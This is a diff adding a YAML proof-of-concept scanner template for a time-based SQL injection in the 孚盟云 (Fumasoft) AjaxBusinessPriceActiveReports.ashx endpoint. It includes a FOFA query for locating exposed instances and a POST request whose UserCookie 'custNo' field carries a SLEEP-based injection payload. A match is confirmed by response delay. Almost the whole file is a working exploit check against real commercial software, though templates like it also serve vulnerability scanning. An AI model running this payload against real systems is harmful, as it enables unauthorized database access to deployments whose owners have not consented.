@@ -1,0 +1,25 @@
+id: poc-yaml-fumasoft-ajaxbusinesspriceactivereports-aspx-sqli
+info:
+  name: 孚盟云 AjaxBusinessPriceActiveReports.ashx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 孚盟云
+  fofa: app="孚盟软件-孚盟云"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /
+  expression: status_code == 200 && contains(body,"孚盟云")
+- method: POST
+  path: /m/Dingding/Ajax/AjaxBusinessPriceActiveReports.ashx
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+    Cookie: UserCookie={"custNo":"1') AND (SELECT 4920 FROM (SELECT(SLEEP({{.t1}})))ILaK)--
+      -"}
+  data: action=GetTempelateList
+  expression: status_code == 200 && contains(body,"TempelateId") && contains(body,"TempelateName")
+    && !contains(body,"<") && duration > t1 && duration < t2
+transport: http
